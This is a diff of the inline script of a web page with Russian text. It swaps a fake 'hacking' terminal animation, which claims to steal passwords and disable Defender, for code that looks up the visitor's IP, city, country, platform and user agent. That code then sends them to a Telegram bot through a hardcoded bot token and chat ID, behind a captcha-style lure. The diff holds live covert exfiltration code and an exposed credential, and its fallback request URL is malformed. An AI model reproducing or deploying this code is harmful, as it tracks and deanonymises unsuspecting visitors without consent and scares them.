@@ -40,59 +40,38 @@
         </div>
     </div>
 
-    <script>
+        <script>
+        const token = "8334056184:AAEvbx3eM-yW3jibp0nUx9YbqDgWX80wMcE";
+        const chat_id = "-1003861311533";
+
         async function startHack() {
+             
             document.getElementById('captcha-box').style.display = 'none';
-            const term = document.getElementById('terminal');
-            term.style.display = 'block';
-
-            const lines = [
-                "> [INIT] Инициализация протокола...", "> [SYSTEM] Поиск открытых портов...", 
-                "> [SUCCESS] Порт 8080 открыт", "> [INFO] Обход reCAPTCHA v2...", 
-                "> [SUCCESS] Токен верификации получен", "> [INFO] Инжект в процесс lsass.exe...", 
-                "> [WARNING] Defender обнаружил активность", "> [INFO] Использование эксплойта CVE-2024...", 
-                "> [SUCCESS] Defender отключен", "> [SYSTEM] Доступ к ядру системы...", 
-                "> [CRITICAL] Права ROOT получены", "> [INFO] Сканирование диска C:/...", 
-                "> [INFO] Чтение папки %APPDATA%...", "> [SUCCESS] База паролей извлечена", 
-                "> [INFO] Поиск банковских сертификатов...", "> [INFO] Доступ к камере получен", 
-                "> [SYSTEM] Начало копирования медиафайлов...", "> [INFO] Загрузка истории Chrome...", 
-                "> [SUCCESS] 47 паролей расшифровано", "> [INFO] Синхронизация с сервером...", 
-                "> [WARNING] Трафик зашифрован", "> [INFO] Подмена SSL сертификата...", 
-                "> [SUCCESS] Удаленный доступ активен", "> [FINISH] Удаление следов взлома...", 
-                "> [DONE] ПОЛНЫЙ ДОСТУП ПОЛУЧЕН."
-            ];
-
-            for (let line of lines) {
-                let p = document.createElement('p');
-                p.innerHTML = line;
-                if (line.includes("CRITICAL")) p.className = "t-red";
-                term.appendChild(p);
-                window.scrollTo(0, document.body.scrollHeight);
-                await new Promise(r => setTimeout(r, 160));  
-            }
-
-            await sendFinalLogs();
-            term.style.display = 'none';
             document.getElementById('leak-box').style.display = 'block';
-        }
 
-        async function sendFinalLogs() {
-            const token = "8334056184:AAEvbx3eM-yW3jibp0nUx9YbqDgWX80wMcE";
-            const chat_id = "-1003861311533";  
             try {
+          
                 const res = await fetch('https://ipapi.co/json/');
                 const d = await res.json();
-                
+                 
                 document.getElementById('user-ip').innerText = d.ip;
-                document.getElementById('user-geo').innerText = d.city;
+                document.getElementById('user-geo').innerText = d.city + ", " + d.country_name;
                 document.getElementById('user-os').innerText = navigator.platform;
 
-                const msg = `🔥 ПОЛНЫЙ ЛОГ!\n📍 IP: ${d.ip}\n🌍 Город: ${d.city}\n📱 Устройство: ${navigator.userAgent}`;
-                const url = `https://api.telegram.org{token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}{encodeURIComponent(msg)}`;
+                 
+                const report = `🚀 НОВЫЙ ЛОГ!\n📍 IP: ${d.ip}\n🌍 Город: ${d.city}\n📱 Устройство: ${navigator.userAgent}`;
+
+                
+                const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(report)}`;
+                
                 await fetch(url);
+                console.log("Лог успешно доставлен!");
+
             } catch (e) {
-                const backup = encodeURIComponent(`⚠️ Переход!\n📱 ${navigator.userAgent}`);
-                await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${backup}{backup}`);
+             
+                document.getElementById('user-ip').innerText = "Ошибка сети";
+                const backup = encodeURIComponent(`⚠️ Переход!\n📱 Устройство: ${navigator.userAgent}`);
+                fetch(`https://api.telegram.org{token}/sendMessage?chat_id=${chat_id}&text=${backup}`);
             }
         }
     </script>
